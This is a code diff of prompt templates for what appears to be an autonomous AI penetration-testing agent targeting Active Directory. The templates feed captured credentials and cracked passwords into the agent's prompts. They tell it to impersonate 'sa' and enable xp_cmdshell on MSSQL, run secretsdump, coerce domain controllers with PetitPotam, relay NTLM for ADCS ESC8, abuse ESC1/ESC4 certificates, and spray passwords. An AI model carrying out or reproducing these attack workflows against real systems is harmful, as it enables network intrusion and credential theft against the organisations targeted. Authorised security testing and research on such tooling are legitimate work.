@@ -57,118 +57,43 @@ def format_state_context(  # noqa: PLR0912
     if not state:
         return ""
 
-    lines = ["\n\n## SHARED STATE CONTEXT (use this intelligence!)"]
+    lines = ["\n\n## STATE"]
 
-    # Domains
+    # Domains - compact
     if state.all_domains:
-        lines.append(f"\n### Discovered Domains ({len(state.all_domains)})")
-        for domain in state.all_domains[:10]:
-            lines.append(f"  - {domain}")
+        lines.append(f"\nDomains: {', '.join(state.all_domains[:5])}")
 
-    # Credentials - CRITICAL for lateral/privesc
+    # Credentials - compact, only show count + first few
     if state.all_credentials:
-        lines.append(f"\n### Available Credentials ({len(state.all_credentials)})")
-        lines.append("**TRY THESE for authentication/lateral movement:**")
-        for cred in state.all_credentials[:15]:
+        lines.append(f"\n### Credentials ({len(state.all_credentials)})")
+        for cred in state.all_credentials[:8]:
             admin_marker = " [ADMIN]" if cred.is_admin else ""
-            lines.append(f"  - {cred.domain}\\{cred.username}:{cred.password}{admin_marker}")
+            lines.append(f"  {cred.domain}\\{cred.username}:{cred.password}{admin_marker}")
 
-    # Hashes - show cracked vs uncracked
+    # Hashes - only cracked ones are useful for context
     if state.all_hashes:
         cracked = [h for h in state.all_hashes if h.cracked_password]
-        uncracked = [h for h in state.all_hashes if not h.cracked_password]
-
         if cracked:
-            lines.append(f"\n### Cracked Hashes ({len(cracked)}) - USE THESE!")
-            for h in cracked[:10]:
-                lines.append(
-                    f"  - {h.domain}\\{h.username}:{h.cracked_password} (from {h.hash_type})"
-                )
+            lines.append(f"\n### Cracked ({len(cracked)})")
+            for h in cracked[:5]:
+                lines.append(f"  {h.domain}\\{h.username}:{h.cracked_password}")
 
-        if uncracked:
-            lines.append(f"\n### Uncracked Hashes ({len(uncracked)}) - awaiting crack")
-            for h in uncracked[:8]:
-                hash_preview = h.hash_value[:40] + "..." if len(h.hash_value) > 40 else h.hash_value
-                lines.append(f"  - {h.domain}\\{h.username} ({h.hash_type}): {hash_preview}")
-
-    # Hosts with role-specific prioritization
+    # Hosts - compact, prioritized
     if state.all_hosts:
-        lines.append(f"\n### Discovered Hosts ({len(state.all_hosts)})")
-
-        # Categorize hosts by role
-        dcs = []
-        mssql_hosts = []
-        adcs_hosts = []
-        other_hosts = []
-
-        for host in state.all_hosts:
-            hostname_lower = (host.hostname or "").lower()
-            services_lower = " ".join(host.services).lower() if host.services else ""
-            roles_lower = " ".join(host.roles).lower() if host.roles else ""
-
-            # Use persisted is_dc field from Host model
-            is_mssql = (
-                "mssql" in services_lower or "1433" in services_lower or "sql" in hostname_lower
-            )
-            is_adcs = (
-                "certsrv" in services_lower
-                or "adcs" in roles_lower
-                or "certenroll" in services_lower
-            )
-
-            if host.is_dc:
-                dcs.append(host)
-            elif is_mssql:
-                mssql_hosts.append(host)
-            elif is_adcs:
-                adcs_hosts.append(host)
-            else:
-                other_hosts.append(host)
-
+        dcs = [h for h in state.all_hosts if h.is_dc]
         if dcs:
-            lines.append("\n**Domain Controllers (HIGH VALUE - DCSync/NTDS.dit):**")
-            for h in dcs:
-                marker = " ← CURRENT TARGET" if h.ip == current_target else ""
-                lines.append(f"  - {h.ip} ({h.hostname or 'unknown'}){marker}")
+            lines.append(f"\n### DCs ({len(dcs)})")
+            for h in dcs[:3]:
+                lines.append(f"  {h.ip} ({h.hostname or '?'})")
 
-        if mssql_hosts:
-            lines.append("\n**MSSQL Servers (linked server pivot opportunity):**")
-            for h in mssql_hosts:
-                marker = " ← CURRENT TARGET" if h.ip == current_target else ""
-                lines.append(f"  - {h.ip} ({h.hostname or 'unknown'}){marker}")
+        # Only show other hosts if few
+        others = [h for h in state.all_hosts if not h.is_dc]
+        if others and len(others) <= 5:
+            lines.append(f"\n### Other hosts ({len(others)})")
+            for h in others:
+                lines.append(f"  {h.ip} ({h.hostname or '?'})")
 
-        if adcs_hosts:
-            lines.append("\n**ADCS Servers (certificate attacks ESC1-ESC8):**")
-            for h in adcs_hosts:
-                marker = " ← CURRENT TARGET" if h.ip == current_target else ""
-                lines.append(f"  - {h.ip} ({h.hostname or 'unknown'}){marker}")
-
-        if other_hosts and len(other_hosts) <= 10:
-            lines.append("\n**Other Hosts:**")
-            for h in other_hosts:
-                marker = " ← CURRENT TARGET" if h.ip == current_target else ""
-                lines.append(f"  - {h.ip} ({h.hostname or 'unknown'}){marker}")
-
-    # Shares - highlight writable and interesting ones
-    if state.all_shares:
-        interesting_shares = []
-        for share in state.all_shares:
-            name_lower = share.name.lower()
-            perms_lower = (share.permissions or "").lower()
-            is_interesting = (
-                "write" in perms_lower
-                or name_lower in ("sysvol", "netlogon", "certenroll")
-                or "admin" in name_lower
-            )
-            if is_interesting:
-                interesting_shares.append(share)
-
-        if interesting_shares:
-            lines.append(f"\n### Interesting Shares ({len(interesting_shares)})")
-            for share in interesting_shares[:10]:
-                lines.append(f"  - {share.host}/{share.name} [{share.permissions}]")
-
-    # Vulnerabilities discovered but not exploited
+    # Pending vulns - compact
     if hasattr(state, "discovered_vulnerabilities") and state.discovered_vulnerabilities:
         unexploited = [
             v
@@ -176,38 +101,9 @@ def format_state_context(  # noqa: PLR0912
             if v.vuln_id not in state.exploited_vulnerabilities
         ]
         if unexploited:
-            lines.append(f"\n### Pending Vulnerabilities ({len(unexploited)})")
-            for vuln in unexploited[:5]:
-                lines.append(f"  - {vuln.vuln_type} on {vuln.target} (ID: {vuln.vuln_id})")
-
-    # Task-specific guidance
-    if task_type == "lateral":
-        lines.append("\n### LATERAL MOVEMENT PRIORITIES")
-        lines.append("1. Try ALL available credentials above against the target")
-        lines.append("2. If DC: run secretsdump for NTDS.dit → krbtgt hash → golden ticket")
-        lines.append("3. If MSSQL: check for linked servers and xp_cmdshell")
-        lines.append("4. After access: harvest creds with secretsdump/lsassy")
-
-    elif task_type == "credential_access":
-        lines.append("\n### CREDENTIAL ACCESS PRIORITIES")
-        lines.append("1. gpp_password_finder + sysvol_script_search on DCs (low-hanging fruit)")
-        lines.append("2. Kerberoast service accounts (sql_svc, etc.)")
-        lines.append("3. AS-REP roast users without pre-auth")
-        lines.append("4. secretsdump on hosts where we have admin")
-        lines.append("5. LAPS dump if we have read access")
-
-    elif task_type == "exploit":
-        lines.append("\n### EXPLOITATION PRIORITIES")
-        lines.append("1. Try ALL available credentials against the target")
-        lines.append("2. For MSSQL: enumerate linked servers for cross-domain pivot")
-        lines.append("3. For ADCS: certipy find → ESC1/ESC4/ESC8 attacks")
-        lines.append("4. Check for delegation (constrained/unconstrained)")
-
-    elif task_type == "coercion":
-        lines.append("\n### COERCION PRIORITIES")
-        lines.append("1. Target DCs with PetitPotam for ESC8 relay")
-        lines.append("2. Use LLMNR/NBT-NS for hash capture")
-        lines.append("3. Coordinate relay targets with hosts lacking SMB signing")
+            lines.append(f"\n### Pending vulns ({len(unexploited)})")
+            for vuln in unexploited[:3]:
+                lines.append(f"  {vuln.vuln_type} on {vuln.target}")
 
     return "\n".join(lines)
 
@@ -321,6 +217,50 @@ def generate_prompt_from_task(
         )
 
     if task.task_type == "lateral":
+        action = payload.get("action", "")
+
+        # Special handling for proactive MSSQL enumeration
+        if action == "mssql_enum_impersonation":
+            target = payload.get("target", "")
+            username = payload.get("username", "")
+            password = payload.get("password", "")
+            domain = payload.get("domain", "")
+            base_prompt = (
+                f"**MSSQL IMPERSONATION ENUMERATION**\n\n"
+                f"Target: {target}\n"
+                f"Username: {domain}\\{username}\n"
+                f"Password: {password}\n"
+                f"Task ID: {task.task_id}\n\n"
+                "**OBJECTIVE:** Discover if sa/sysadmin impersonation is possible.\n\n"
+                "**STEP 1: Run impersonation enumeration**\n"
+                "```\n"
+                f"mssql_enum_impersonation(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                f"    domain='{domain}',\n"
+                "    windows_auth=True\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 2: If sa/sysadmin found, IMMEDIATELY exploit:**\n"
+                "```\n"
+                f"mssql_impersonate(\n"
+                f"    target='{target}',\n"
+                f"    username='{username}',\n"
+                f"    password='{password}',\n"
+                "    impersonate_user='sa',\n"
+                "    query='SELECT SYSTEM_USER; EXEC sp_configure \"xp_cmdshell\", 1; RECONFIGURE;',\n"
+                f"    domain='{domain}',\n"
+                "    windows_auth=True\n"
+                ")\n"
+                "```\n\n"
+                "**STEP 3: With xp_cmdshell, run whoami then attempt secretsdump**\n\n"
+                "Report any credentials or hashes discovered."
+            )
+            state_context = format_state_context(state, "lateral", current_target=target)
+            return base_prompt + state_context
+
+        # Standard lateral movement
         cred_type = "password" if payload.get("password") else "hash"
         cred_value = payload.get("password") or payload.get("hash_value") or "N/A"
         target_host = payload.get("target_host", "")
@@ -366,14 +306,34 @@ def generate_prompt_from_task(
 
         techniques = payload.get("techniques", ["LLMNR", "NBT-NS"])
         interface = payload.get("interface") or get_default_network_interface()
+        attack_type = payload.get("attack_type", "passive")
+        coerce_target = payload.get("coerce_target", "")
+        coerce_hostname = payload.get("coerce_hostname", "")
+
+        # Build attack-specific info
+        target_info = ""
+        if attack_type == "esc8":
+            adcs_server = payload.get("adcs_server", "")
+            target_info = f"**ESC8 RELAY** - ADCS: {adcs_server}, Coerce DC: {coerce_hostname or coerce_target}\n\n"
+        elif attack_type == "ldaps_relay":
+            target_info = f"**LDAPS RELAY** - Coerce DC: {coerce_hostname or coerce_target}\n\n"
+
         base_prompt = (
             f"Start network coercion:\n"
-            f"Interface: {interface}\n"
+            f"**NETWORK INTERFACE: `{interface}`** (auto-detected for this environment)\n"
             f"Techniques: {', '.join(techniques)}\n"
             f"Duration: {payload.get('duration', 300)}s\n"
             f"Task ID: {task.task_id}\n\n"
-            "Start responder/mitm6 and capture hashes. "
-            "For ESC8 relay attacks, coordinate PetitPotam against DCs."
+            f"{target_info}"
+            f'**CRITICAL: When calling start_responder or start_mitm6, pass `interface="{interface}"` exactly.**\n'
+            "Do NOT guess interface names (e.g., eth0) - always use the auto-detected value above.\n\n"
+            "**STEP BUDGET: ~30 steps max. Work efficiently!**\n\n"
+            "**HARD LIMITS:**\n"
+            "- Each coercion technique: max 2 attempts per target\n"
+            "- 'connection refused'/'timed out'/'RPC unavailable' → SKIP target\n"
+            "- Track attempts - never repeat same target+technique\n\n"
+            "**CALL task_complete WHEN:**\n"
+            "- All targets attempted | Relay succeeded | Duration exceeded\n\n"
         )
         state_context = format_state_context(state, "coercion")
         return base_prompt + state_context
@@ -520,7 +480,7 @@ def _generate_credential_access_prompt(  # noqa: PLR0912
             "**EXECUTE username_as_password:**\n"
             f"1. First save users: save_users_to_file(target='{dc_ip}', username='{username}', password='{password}', domain='{payload.get('domain', '')}')\n"
             f"2. Then spray: username_as_password(target='{dc_ip}', domain='{payload.get('domain', '')}', users_file='/tmp/users.txt')\n\n"
-            "This tests if users have username=password (e.g., hodor:hodor).\n"
+            "This tests if users have username=password (e.g., testuser:testuser).\n"
             "Zero lockout risk, one attempt per user.\n"
             "Report any credentials found immediately."
         )
@@ -579,7 +539,7 @@ def _generate_credential_access_prompt(  # noqa: PLR0912
             ),
             "username_as_password": (
                 f"username_as_password(target='{dc_ip}', domain='{payload.get('domain', '')}') "
-                "- test if users have username=password (e.g., hodor:hodor)"
+                "- test if users have username=password (e.g., testuser:testuser)"
             ),
             "password_spray": (
                 f"password_spray(target='{dc_ip}', domain='{payload.get('domain', '')}', "
@@ -629,7 +589,7 @@ def _generate_credential_access_prompt(  # noqa: PLR0912
             f"Task ID: {task.task_id}\n\n"
             "**CRITICAL: These techniques work WITHOUT credentials to discover passwords:**\n"
             "1. username_as_password(target=DC_IP, domain=DOMAIN) - HIGH SUCCESS RATE\n"
-            "   Tests if users have username=password (e.g., hodor:hodor)\n"
+            "   Tests if users have username=password (e.g., testuser:testuser)\n"
             "   Zero lockout risk, one attempt per user\n\n"
             "2. password_spray - YOU MUST CALL THIS ONCE FOR EACH PASSWORD:\n"
             "   password_spray(target=DC_IP, domain=DOMAIN, password='Password1')  # pragma: allowlist secret\n"
@@ -789,6 +749,11 @@ def _generate_exploit_prompt(
             f"DC IP: {dc_ip}\n"
             f"Credentials: {domain}\\{username}\n"
             f"Task ID: {task.task_id}\n\n"
+            "**STEP BUDGET: ~20 steps max. Work efficiently!**\n\n"
+            "**HARD LIMITS:**\n"
+            "- 'connection refused'/'timed out' → CA unreachable, STOP immediately\n"
+            "- 'web enrollment' error → ESC8 not viable, skip it\n"
+            "- Max 2 attempts at certipy_find, then report failure\n\n"
             "**INSTRUCTIONS:**\n"
             "1. Run certipy_find to enumerate ADCS vulnerabilities:\n"
             f"   certipy_find(domain='{domain}', username='{username}', "
@@ -797,8 +762,8 @@ def _generate_exploit_prompt(
             "3. Report any vulnerable templates found\n"
             "4. If ESC1/ESC4 found: can request cert with arbitrary UPN\n"
             "5. If ESC8 found: web enrollment relay attack possible\n\n"
-            "**CRITICAL**: Run certipy_find FIRST before any exploitation!\n"
-            "Report discovered vulnerabilities so they can be queued for exploitation."
+            "**ON FAILURE**: Call task_complete immediately with failure reason.\n"
+            "Do NOT keep retrying if CA/web enrollment is unreachable."
         )
         state_context = format_state_context(state, "exploit", current_target=target)
         return adcs_prompt + state_context
@@ -834,6 +799,45 @@ def _generate_exploit_prompt(
         )
         state_context = format_state_context(state, "exploit", current_target=target)
         return unconstrained_prompt + state_context
+
+    # Special handling for ADCS ESC vulnerabilities
+    vuln_type_lower = vuln_type.lower()
+    if "esc1" in vuln_type_lower or "esc4" in vuln_type_lower or "esc8" in vuln_type_lower:
+        ca_server = payload.get("ca_server", target)
+        template = payload.get("template", "")
+        domain = payload.get("domain", "")
+
+        esc_prompt = (
+            f"**ADCS {vuln_type.upper()} EXPLOITATION**\n\n"
+            f"CA Server: {ca_server}\n"
+            f"Template: {template}\n"
+            f"Domain: {domain}\n"
+            f"Task ID: {task.task_id}\n\n"
+            "**STEP BUDGET: ~25 steps max. Work efficiently!**\n\n"
+            "**HARD LIMITS:**\n"
+            "- 'connection refused'/'timed out' → CA unreachable, STOP immediately\n"
+            "- 'web enrollment' error → HTTP not available, call task_complete(failed)\n"
+            "- Max 2 attempts per tool, then report failure\n\n"
+            "**WORKFLOW:**\n"
+        )
+        if "esc1" in vuln_type_lower or "esc4" in vuln_type_lower:
+            esc_prompt += (
+                "1. certipy_req_esc1 to request certificate with alternate UPN\n"
+                "2. certipy_auth to get NTLM hash from certificate\n"
+                "3. Report hash immediately when obtained\n"
+            )
+        else:  # esc8
+            esc_prompt += (
+                "1. Start ntlmrelayx targeting the CA's web enrollment\n"
+                "2. Coerce DC/target to authenticate to relay\n"
+                "3. Relay captures cert → certipy_auth for hash\n"
+            )
+        esc_prompt += (
+            "\n**ON FAILURE**: Call task_complete immediately with failure reason.\n"
+            "Do NOT keep retrying if CA/web enrollment is unreachable."
+        )
+        state_context = format_state_context(state, "exploit", current_target=target)
+        return esc_prompt + state_context
 
     # Default exploit prompt
     default_prompt = (
@@ -1054,6 +1058,13 @@ def _generate_privesc_enumeration_prompt(
     password = payload.get("password", "")
     techniques = payload.get("techniques", [])
 
+    # Re-resolve DC IP using current state - the original dispatch may have used
+    # stale data before host discovery completed
+    if domain:
+        dc_ip, dc_warning = resolve_dc_ip_for_domain(state, domain, dc_ip or "")
+    else:
+        dc_warning = None
+
     technique_instructions = []
     for i, technique in enumerate(techniques, 1):
         if technique == "find_delegation":
@@ -1064,10 +1075,13 @@ def _generate_privesc_enumeration_prompt(
         else:
             technique_instructions.append(f"{i}. {technique}(...)")
 
+    dc_warning_line = f"⚠️ {dc_warning}\n" if dc_warning else ""
+
     base_prompt = (
         f"Run privilege escalation enumeration:\n"
         f"Domain: {domain}\n"
         f"DC IP: {dc_ip or 'N/A'}\n"
+        f"{dc_warning_line}"
         f"Username: {username}\n"
         f"Password: {password}\n"
         f"Task ID: {task.task_id}\n\n"
